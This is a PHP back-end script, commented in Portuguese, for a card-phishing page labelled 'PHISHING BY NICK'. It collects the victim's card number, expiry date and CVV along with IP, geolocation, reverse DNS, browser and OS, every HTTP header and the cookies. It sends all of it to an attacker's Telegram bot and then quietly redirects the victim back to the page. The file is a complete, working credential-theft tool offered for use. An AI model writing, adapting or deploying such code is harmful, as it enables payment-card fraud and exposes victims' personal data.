<?php
ob_start(); // Inicia buffer para evitar erros de header já enviados

// 1. Geolocalização via ip-api.com
function getIpInfo(string $ip): array {
    $apiUrl  = "http://ip-api.com/json/{$ip}";
    $apiData = @file_get_contents($apiUrl); // Suprime warnings
    if ($apiData === false) {
        return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
    }
    $data = json_decode($apiData, true);
    if (!isset($data['status']) || $data['status'] !== 'success') {
        return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
    }
    return $data;
}

// 2. Detecção de SO e navegador a partir do User-Agent e Client Hints
function detectClient(string $ua): array {
    $os = 'Desconhecido';
    if (stripos($ua, 'Windows') !== false)    $os = 'Windows';
    elseif (stripos($ua, 'Android') !== false) $os = 'Android';
    elseif (stripos($ua, 'Linux') !== false)   $os = 'Linux';
    elseif (stripos($ua, 'Mac') !== false)     $os = 'macOS';
    elseif (stripos($ua, 'iPhone') !== false)  $os = 'iOS';

    $browser = 'Desconhecido';
    if (stripos($ua, 'Firefox') !== false)   $browser = 'Firefox';
    elseif (stripos($ua, 'MSIE')    !== false ||
            stripos($ua, 'Trident') !== false) $browser = 'Internet Explorer';
    elseif (stripos($ua, 'Edge')    !== false) $browser = 'Microsoft Edge';
    elseif (stripos($ua, 'Chrome')  !== false) $browser = 'Google Chrome';
    elseif (stripos($ua, 'Safari')  !== false) $browser = 'Safari';
    elseif (stripos($ua, 'Opera')   !== false ||
            stripos($ua, 'OPR')     !== false) $browser = 'Opera';

    return [$os, $browser];
}

// 3. Envio ao Telegram via cURL
function sendToTelegram(string $botToken, string $chatId, string $message): bool {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = ['chat_id'=>$chatId, 'text'=>$message];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    if ($response === false) {
        error_log("cURL Error: " . curl_error($ch));
        curl_close($ch);
        return false;
    }
    curl_close($ch);
    return true;
}

// Fluxo principal
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Sanitização dos campos
    $num = trim($_POST['campoNome']  ?? '');
    $val = trim($_POST['campoTel']   ?? '');
    $cvv = trim($_POST['campoTel2']  ?? '');

    if ($num === '' || $val === '' || $cvv === '') {
        echo 'Por favor, preencha todos os campos.';
        ob_end_flush();
        exit;
    }

    // IP real do cliente (respeitando proxy)
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip  = trim($ips[0]);
    } else {
        $ip  = $_SERVER['REMOTE_ADDR'];
    }

    // Lookup reverso de DNS
    $hostname = gethostbyaddr($ip);

    $ua      = $_SERVER['HTTP_USER_AGENT']      ?? 'N/A';
    $lang    = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'N/A';
    $info    = getIpInfo($ip);
    [$os, $browser] = detectClient($ua);
    $headers = getallheaders(); // Todos os cabeçalhos 7
    $now     = date('Y-m-d H:i:s');

    // Montagem da mensagem
    $msg  = "☠️ | PHISHING BY NICK\n\n";
    $msg .= "💳 Cartão: {$num}\n📅 Validade: {$val}\n🔑 CVV: {$cvv}\n\n";
    $msg .= "🏠 IP: {$info['query']}\n";
    $msg .= "🔎 Cidade: {$info['city']}\n";
    $msg .= "📍 Região: {$info['regionName']}\n";
    $msg .= "🌎 País: {$info['country']}\n";
    $msg .= "📦 ISP: {$info['isp']}\n";
    $msg .= "🔍 Hostname reverso: {$hostname}\n\n";
    $msg .= "🖥 OS: {$os}\n🌐 Navegador: {$browser}\n";
    $msg .= "🗣 Linguagem: {$lang}\n📆 Data/Hora: {$now}\n\n";

    // Cabeçalhos HTTP completos
    $msg .= "📥 Cabeçalhos HTTP:\n";
    foreach ($headers as $k => $v) {
        $msg .= " - {$k}: {$v}\n";
    }

    // Informações de requisição detalhadas 8
    $msg .= "\n🔄 Request Info:\n";
    $msg .= " - Método: {$_SERVER['REQUEST_METHOD']}\n";
    $msg .= " - URI: {$_SERVER['REQUEST_URI']}\n";
    $msg .= " - Protocolo: {$_SERVER['SERVER_PROTOCOL']}\n";
    $msg .= " - Host: " . ($_SERVER['HTTP_HOST'] ?? 'N/A') . "\n";
    $msg .= " - Referer: " . ($_SERVER['HTTP_REFERER'] ?? 'N/A') . "\n";
    $msg .= " - Cookies: " . ($_SERVER['HTTP_COOKIE'] ?? 'N/A') . "\n\n";

    // Credenciais do Telegram via ambiente 9
    $token  = getenv('BOT_TOKEN') ?: '';
    $chatId = getenv('CHAT_ID')   ?: '';

    if (sendToTelegram($token, $chatId, $msg)) {
        header('Location: index.html');
        exit;
    } else {
        echo 'Houve um erro ao enviar os dados. Tente novamente.';
    }

} else {
    header('Location: index.html');
    exit;
}

ob_end_flush();